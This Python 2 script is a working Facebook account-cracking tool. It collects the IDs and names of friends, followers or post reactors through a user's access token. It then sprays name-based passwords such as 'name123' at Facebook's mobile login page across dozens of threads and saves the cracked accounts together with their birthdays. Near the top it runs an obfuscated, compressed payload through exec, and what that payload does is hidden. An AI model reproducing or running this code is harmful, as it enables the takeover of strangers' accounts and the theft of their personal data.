# -*- coding: utf-8
# coded by angga kurniawan
# fb.me/gaaaarzxd
# instagram.com/gaaarzxd

try:
	import requests
	import sys
	import os
	import subprocess
	import random
	import time
	import re
	import json
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
	from datetime import datetime
except Exception as modul:
	print(" \033[0;97m[\033[0;91m!\033[0;97m] %s installed yet"%(modul))
	exit(" \033[0;97m[\033[0;93m#\033[0;97m] Please Type : pip2 install requests")

loop = 0
ok = []
cp = []
id = []
pwx = []

s = requests.Session()
rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
ua = s.get("https://raw.githubusercontent.com/avsid/data-anggaxd/main/ua.txt").text.strip()
ip = s.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
	
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

exec((lambda _____, ______ : ______(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 122, 108, 105, 98, 34, 41, 46, 100, 101, 99, 111, 109, 112, 114, 101, 115, 115],chr))(_____),"<GAAAARZXD>","exec"))(b'x\x9cUViW\x1b9\x10\xfc\x9e_1\x01/\xd8\xc4\x804\xf7\x10H\x02\xc1\x98\xfb\x8a\x81\x04\x86\x18I3\x03\x04c\x1b\x02\x8e7\x04~\xfbv\xa9\xc5\xdb]\x1esX#\xb5\xfa\xa8\xaa\xd6\xa4\xd7\xd9\xd8m\xb7\x97\xb7\xbd\xfd\xe5\xad\x96\xb7\xbc\xb9\xbc\xee\x1dn\xac\xb4:\xde\xd6\xdengo\xfb\xf4\xcd\xa4\xb7\xaa\xfa\xde\xa6\xea_\xd2c\xfbq\xa8\xbc\xb5A\xaf7\xf8\xe5\xb5\xaf\x1f\xae\x1e\xb5\xd7~To\xcaqi\xea\xf5\x9e\xba\xd5\x85\xf2\xba\xf8k\xf2\xa3\xeb-\xb8\x97z9R\xbd\xff\xcdi\xe2\xdf}\x9f\xfb1\xb8\xee\xd7\xcf\xbauzox\xd5\xe0\x1e\xa3\xdeu\x9f\x1e\xe7\x8dF}z\xbay\x96EM\x0f\x97\x14\xf6\x96\xd1M\xfa\xb8I\xdcB\xdcb\x9e\x81+\x14M/\xc0\xa0\x8f9"u\xeb\xb2\x94\x87CZ\x14\xc6\x18\x14\xb8\xd1\xaf,{\xb5\xf5\x1f\xd3\xa1\xfb(edo\xe7MsuO\xfe\xd8\x88\x1a\xcd\x89\xc5\xf62\xfd\x1d\x9e~]\xfd0\xd1\x9c@\x16&\xe8\xab\x9e\x1e\xe7\xe3\xcc\x1cun\xbe\xe4c\xa96\xe8\x16\xe6\xe3\xaa\xa0\xc1\xb2+\xf3q\xea\xe7c\x11\xe5c\x13\xd0{\xbc\x93\x8f\xb5\xa2\x97\x84\xa6e\xf9\xb8L\xf3q!k\x7f\xe5cehT\xd1|\x11\xc74\x99.M\xdfTI\xa3t\x19\xfaPf0\xc9WJ\xdfDEsD\x9e\xd7\xaeF\xbc_Y<\xd1(f$\x1d\xfc:\xdc\xfe\xd8\'\xf34\xadJ\x96p;\xa6\x85\xe4\x85\n\xf0\x03\xef/d\xa1\xa2ER\xd0\x089P\x94l\x89\xcc\x8ee\xf0\xc0\xd3\xb4~r\x0e\xd0Ui\x9ee\xca\x03\xfa!\x14\x1c\x91\x14\x90\xc4\xb6dA\xd3S\xc19\n\xa0\xa0\xb9UV\xa3\x17\x1a0U>\xcd\xceX\xe3\xc5"\xfd\xa0\xf9e\xe4lcg\xca[\x19\xc3]\xb5\xc4\xa9I\xabKD\x83Xc\x8c|\xa4[8\xcf\xbe\x1a\x1f\xae\x91-\x8d\x1f\xd9\xe0\x96f"}\xc9$}\x877\xe4\x95\xa69i\xc15\xc0\xb3\x88\xde\xf26U\xc0FJ2\x9bT\x8b;XrB?isUq\xda\x15v\x0c6\xc6q\xde\xbf\xa34\x8a\x90\x9d\xc5jT\xa0\x08/\x16\xe1\xfa\x08\xf9\xb8"\xf3\xb0\x1a\xfd\x86\xe9\xe6\x0e\xef.$\xf9\xab\x00\x84x\x0b\xc5m\xb5\xf3<\xe4x\xb2t\xeb\x8c\xe2\xab\x90\x182\xaa\x14\xc3A\x87\xeb4\x11\xf1\xa4\\&c6\xe7\xa2\x15`\xe0-\xe3J\'\x1b\x9d<\x1f\x92\xbd\x82>g\x15\xc3\t\xf1\xaa`\xe1\xfb\xd2\x0f\x1a+\x9a\xbc\x07bD\x10Zs\x8e\xd2\x84\xdc1\x9a\xc1\x83\x9a\x19r\xcd\xd03\xd3\x84\x03\x89JW\x0cSk:\x00\x84~\xd1KD\xa3i\xf4\x8d\xebZ\nd\x91\xae\x98\x97\x14\xd9\xc4c\x97Qg\x13g\x87\xe8\xe9SJT\xd6\xa3\x1b\x8a\x1b\xf4\x08-2\xe6o(\\\xa5\x0e\x18+\x1a\x0c\x01\x04\x95F\xfdf\xe9\x16:\xe4\xb84\x00\x82\xc8\x91@q\xd3\xfc\x81\xd7U!\x16\xc7<%\x0bn\x18V\xa5\x84\xafj\x8f\xde\xf4\xbf\x9be\x1aa\xcd\xa7O\x0c\xd1\xd4&\xfb\xdb\x90\x06\xc5\xe5\xa9i"\xa8\xc3\n\xd1\xfe\r\xd4\xa3\n\xbb\xb0=\xc4\x10\xa0J\x96\xc4\x04\xc2\x07\x06Pg\x8a\xf4\xdeb\x9b\x83\xca\xe8\xaa\xe4i\xba8\xa2<\xa6p\xc3\xdf\x049P-lR-[\xe4\x11\\TD\xfbgb\x0b\x96\x9b3\x9cQ\xb8\xac}\xcb\xf3\xf7\xb4*F\xf2\x98\x91\x88A\x86\x08\x00n\xc4\xc8\x8b\xea\xc0=\xce3\xb6\xc7\x95\t\x08\x0b\xa89\x86{/\x80\xf1o\xec}\x910\x98\x84 \xc3&\xfc\xf9\x95\xd7\x96j\xd2\xd5>\xf8\xdcf\xec\xa1\xf0\nU\xcd\xde\xc1^\xd3\\\xe01~;`\xa5\xc2\xaa\xa4\x1a"J\xc0\xe9#\xd3=U7\xcc0\xf0\xd7~1\x8bp\xc0\x12\x18r\x05\xdcf`}Zu\x99\xfa\xa4 \xfdC\x06_\n\xf5K\xf8]\x97\xf5y\xd0\x08\xb6\xa2\x8c\x93 \xcd\x0c\xa3U\xfav\xc2\xec*\x12\x11\x16\x9c\x1e\xeb>0W\xac\x1e \xdfPQ\xc6,\xb4F\xc6\xb3\xfc\x99\xc4\xadA\xa2\'\x0c\xb3\t\x12\x90!c\xd1\x93\xf5\xf1\xe1e\xaf\xe5R\x8e\xdc)uF\xdf\xfc=\xa6\x0f4\xc3\xa2=,c\x03 \x0b \xa9w\x8c\xda\xb5X\xaf\x8d\r~tk7\xeb3\x1diY\xff\xe0\x885\xc2\x08fF\xaa\xa1\x1f\xf4C\x85\xcc8KG\t\xb8%_P\x07\xa2m\x918IK\x9a\x8c\t\x11\x04g\xb8\x93"\xe8\xe8}~\xcf\x9a\x8a)\x80\xa0\x8c\x8e\x86\xae\xd3\xf8\\;h\x96H\xe0\x86\tC\xce\x89\x0eg\x91\xaeO\x90\xd7\xad9\xe7_\x95\x0c\x01\x8b\x1aS\xddv&\xbfA\xfb\xfb\x8c$\x0c@\x96t\xb9Q\xa2\xea\x80\xe1\x16\x98Wc\x98XI\xf5\xf79\xa1HB\x95\xa2\xc9\xa0\xfd$\x04\x17\xe1stx\x82h0\x0b\x0f_\xc7\x01T\x83\x12\xf8+\x0c\x13+\xec\xc1\xddqw\xd2\x81^8\xa9\x96\x87,\xcf\x85\xdf\x07p4\xaf\x83\xadRA\x05\xd01\xa0\x15\x99\x7f7`\x154\xc9\xa5S\x1f\x03"\x7f\x80\xa3k\xd0P$h\xff\x9b\r\xe0\x13\xaa"O\x90\xcc>\xb0\xbc\xbe\xb9\xee8\x0b\xf9\x8dWY\xb0m\x8b\x88\xecN\xb6\x88`x!\xd7\x81\x1e\xe8e\xf6\x15\x0cp\x05Kmg\\}\x00\xac\x90\xf6\x88\xdd\x16\x89\x13\xc8\xd4\xf6\x8a\x13\xa6\x08*\x00\xf9\x84&\x9b\xea\xa2\xce\x12\xa1,\x1f\xae\xf6\x99\x15*$\xbd\x90\x9a\xdbY\x11\x1ds-!\x7fRL\xa1\x80\x88\x19\xc5]q\x9ak\xd99\x02U5\xcb\x0e\xed\xdf_b\x14#\x02\xd4A\x08\xce\x9f\x89\xdfm\xedv\xe0\x0c\x98\x8e.\x93\x14\xe7\xfb\xed3\xe6\x0b\x88"\xa2\x1aw;+\xc4\xfe\xf9)\xa7:\x8d\xf2ibA\x89SBU_\xc8s\xf8\x16\xc1\x9d\x0fP\xf1)\xf6\xbd\x08\x19\xed*:q\x87\x9b"\x7fX8i\x01\xc8\xc7\x08)!e\x91\xb2x\xff\xf9\xb1\xc11\xe9\xe0\x9eK\x04\xae\x834\x90\xb6\xd2\x0cGW\xfcjp \x10);\x0b\xc0\xa4\xf2\x13\xd82\xe2\x1eT&\xc8au}\x89\x8a\xaf\xf0\x19\x053\x8b\xec\x16T\x00\x92\xd3\xc2\xdc\x91\nMC\xfd3\xc7\x19\xcdnZ\xd5\x92\xaf]\xb1\xc68\x06\xb0\x0b\xab-/<\x13\x92\x81sS)fgnm\xa3\xbe\xff3j\xed\xe8\x82\xbb\x1b\xf7sn@(\x8c\r$\xdc\xb8\xdaK=\xb0\xef\xd2\xb5.\xc8+xm\x1b+R\x14D0\xbd\xc2\x9cH\xcb6\xfa\xee\x97Z<\x80\xba\x99k$X\xc7\xdf\x7f\xbc\xeb\xbd\x1eg\xb6\xe7\xb8\x9fC\x98d\xb4~\xf2\x9e\xbd3z\xea\xad;\xb5\xe1\xfc\x15\x1cbW\xbd\xea \xe4Z<}\xce\xb1Q\xd7E\xf3\xaaAV\xf7\xcf\x7fr\x9f(\x14g\x18\xdd\x16X\x16\xa6\xb6\xe6\xfa\x02\xc2\xabZ\xbe%i\xcau\x02q\rZQ\xc6a\xe3\xb8\x01{\x1a\xc7\x16\xf9\xfc\xec\xa4\x18\xd2gn@HeU\x1d\r\xd0\xac\xfdi@\xd5\xb6\xeb\x16W\xd4\xc5\xf6\xb8\xc9H\xbf\xc6J\xae\xfd9f \xfc@At9\xe5\x0e\xd5\xe8\xde\xc13\x87V\xd8\xe6\x94\xba&\x91\xfd\xd5\xeaZQ\x9cq\xcd\xa1\x9c\xe5c\x95Mp\xa4\x8f\x9e\xb9\x14\x85\xf9\xf6\x0e(t\xa2\xe7\xcf\xbb\x80\x80W0]\x87w\xeb(\x06\x0e>\x99j\xb0\xe8Xh\xc2\x91\xec\xdc\xc9\r\x14\x03\x07\x04`\xc6\x1e\xe4b\xd7\xce\xaa\x8a\xf5N\x8a\x0e\x1f\xb6R9\xdd4\x83\xdb\xe1u\xafl4\xfe\x01\x8cK\x95\xed',compile))

def cookie():
	logo()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] How To Get Cookie : https://youtu.be/X7m_O_tZnTc")
	cookie = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Your Cookie : \033[0;96m")
	try:
		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		   'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
		   'referer'                   : 'https://m.facebook.com/',
		   'host'                      : 'm.facebook.com',
		   'origin'                    : 'https://m.facebook.com',
		   'upgrade-insecure-requests' : '1',
		   'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		   'cache-control'             : 'max-age=0',
		   'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		   'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		   'cookie'                    : cookie
		})
		find_token = re.search('(EAAA\w+)', data.text)
		hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] Your Cookie Invalid" if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
		cookie = open("login.txt", 'w')
		cookie.write(find_token.group(1))
		cookie.close()
		bot_komen()
	except requests.exceptions.ConnectionError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] No Connection')
	if (find_token is None):
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] Cookie Invalid')

def login():
	os.system("clear")
	try:
		token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		logo()
		print("\n \033[0;97m[\033[0;93m*\033[0;97m] Select The Login Method")
		print(" \033[0;97m[\033[0;96m1\033[0;97m] Login With Token Facebook")
		print(" \033[0;97m[\033[0;96m2\033[0;97m] Login With Cookie Facebook")
		ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
		if ask =="":
			login()
		elif ask == "1" or ask == "01":
			tokenz()
		elif ask == "2" or ask == "02":
			cookie()
		else:
			login()
			
def cookie():
	logo()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] How To Get Cookie : https://youtu.be/X7m_O_tZnTc")
	cookie = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Your Cookie : \033[0;96m")
	try:
		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : cookie
		})
		find_token = re.search('(EAAA\w+)', data.text)
		hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] Your Cookie Invalid" if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
	except requests.exceptions.ConnectionError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] No Connection')
	cookie = open("login.txt", 'w')
	cookie.write(find_token.group(1))
	cookie.close()
	bot_komen()
	
def tokenz():
	os.system("clear")
	try:
		token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		logo()
		print("\n \033[0;97m[\033[0;93m*\033[0;97m] How To Get Token : https://youtu.be/RIpCHs7E4qs")
		token = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Your Token : \033[0;96m")
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			avsid = open("login.txt", 'w')
			avsid.write(token)
			avsid.close()
			bot_komen()
		except KeyError:
			exit(" \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid")

def menu():
	os.system('clear')
	global token
	try:
		token = open('login.txt','r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		os.system('clear')
		os.system('rm -rf login.txt')
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		os.system('rm -rf login.txt')
		login()
	except requests.exceptions.ConnectionError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] No Connection')
	logo()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] User Active : %s"%(nama))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] IP Address  : "+ip)
	print(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------") 
	print(" \033[0;97m[\033[0;96m1\033[0;97m] Crack From Public")
	print(" \033[0;97m[\033[0;96m2\033[0;97m] Crack From Follower")
	print(" \033[0;97m[\033[0;96m3\033[0;97m] Crack From Reaction")
	print(" \033[0;97m[\033[0;96m4\033[0;97m] Check Results")
	print(" \033[0;97m[\033[0;96m5\033[0;97m] Setting User-Agent")
	print(" \033[0;97m[\033[0;91m0\033[0;97m] Logout (delete token)")
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
	if ask =="":
		menu()
	elif ask == "1" or ask == "01":
		public()
	elif ask == "2" or ask == "02":
		followers()
	elif ask == "3" or ask == "03":
		reaction()
	elif ask == "4" or ask == "04":
		print("\n \033[0;97m[\033[0;96m1\033[0;97m] Check Results OK")
		print(" \033[0;97m[\033[0;96m2\033[0;97m] Check Results CP")
		ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
		if ask =="":
			menu()
		elif ask == "1" or ask == "01":
			try:
				totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
				print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
				print(" \033[0;97m[\033[0;92m+\033[0;97m] Results \033[0;92mOK\033[0;97m Date : \033[0;92m%s-%s-%s \033[0;97mTotal : %s\033[0;92m"%(ha, op, ta,len(totalok)))
				os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
				exit(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
			except (IOError):
				exit(" \033[0;97m[\033[0;91m!\033[0;97m] No Results Bro")
		elif ask == "2" or ask == "02":
			try:
				totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
				print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
				print(" \033[0;97m[\033[0;92m+\033[0;97m] Results \033[0;93mCP\033[0;97m Date : \033[0;92m%s-%s-%s \033[0;97mTotal : %s\033[0;93m"%(ha, op, ta,len(totalcp)))
				os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
				exit(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
			except (IOError):
				exit(" \033[0;97m[\033[0;91m!\033[0;97m] No Results Bro")
		else:
			menu()
	elif ask == "5" or ask == "05":
		settua()
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt")
		exit(" \033[0;97m[\033[0;96m#\033[0;97m] Successfully Delete Token")
	else:
		menu()

def public():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		tokenz()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Fill In 'me' To Crack From The Friends List")
	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Public : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
	except KeyError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Public Not Found')
	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		name = i['name']
		id.append(uid+'<=>'+name)
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		pwx = []
		sys.stdout.write(
		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		try:os.mkdir("results")
		except OSError:pass
		uid,name=user.split("<=>")
		for ss in name.split(" "):
			if len(ss)<3:
				continue
			else:
				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
					pwx.append(ss+"123")
					pwx.append(ss+"1234")
					pwx.append(ss+"12345")
				else:
					pwx.append(ss+"123")
					pwx.append(ss+"12345")
		try:
			for pw in pwx:
				pw = pw.lower()
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  \033[0;92m* --> ' +uid+ '|' + pw + '       ')
					ok.append(uid+'|'+pw)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						nama = data['name']
						print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '|' + ttl)
						cp.append(uid+'|'+pw+'|'+ttl)
						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
						save.write('  * --> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '       ')
					cp.append(uid+'|'+pw)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(50)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")

def followers():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		tokenz()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Fill In 'me' To Crack From The Followers")
	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Public : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
	except KeyError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Public Not Found')
	r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		name = i['name']
		id.append(uid+'<=>'+name)
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		pwx = []
		sys.stdout.write(
		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		try:os.mkdir("results")
		except OSError:pass
		uid,name=user.split("<=>")
		for ss in name.split(" "):
			if len(ss)<3:
				continue
			else:
				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
					pwx.append(ss+"123")
					pwx.append(ss+"1234")
					pwx.append(ss+"12345")
				else:
					pwx.append(ss+"123")
					pwx.append(ss+"12345")
		try:
			for pw in pwx:
				pw = pw.lower()
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  \033[0;92m* --> ' +uid+ '|' + pw + '       ')
					ok.append(uid+'|'+pw)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						nama = data['name']
						print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '|' + ttl)
						cp.append(uid+'|'+pw+'|'+ttl)
						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
						save.write('  * --> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '       ')
					cp.append(uid+'|'+pw)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")

def reaction():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		tokenz()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Ex :/post/\033[0;92m629986xxxxx\033[0;97m (only id post)")
	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Post : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
	except KeyError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Postingan Not Found')
	r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=5000&access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		name = i['name']
		id.append(uid+'<=>'+name)
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		pwx = []
		sys.stdout.write(
		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		try:os.mkdir("results")
		except OSError:pass
		uid,name=user.split("<=>")
		for ss in name.split(" "):
			if len(ss)<3:
				continue
			else:
				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
					pwx.append(ss+"123")
					pwx.append(ss+"1234")
					pwx.append(ss+"12345")
				else:
					pwx.append(ss+"123")
					pwx.append(ss+"12345")
		try:
			for pw in pwx:
				pw = pw.lower()
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  \033[0;92m* --> ' +uid+ '|' + pw + '       ')
					ok.append(uid+'|'+pw)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						nama = data['name']
						print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '|' + ttl)
						cp.append(uid+'|'+pw+'|'+ttl)
						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
						save.write('  * --> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '       ')
					cp.append(uid+'|'+pw)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")

def manual():
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Example Pass : bismillah,123456,indonesia")
	pw = raw_input(" \033[0;97m[\033[0;93m?\033[0;97m] Set Password : ")
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Crack With Password : \033[0;91m%s"%(pw))
	if len(pw) ==0:
		exit(" \033[0;97m[\033[0;91m!\033[0;97m] Don't Be Empty")
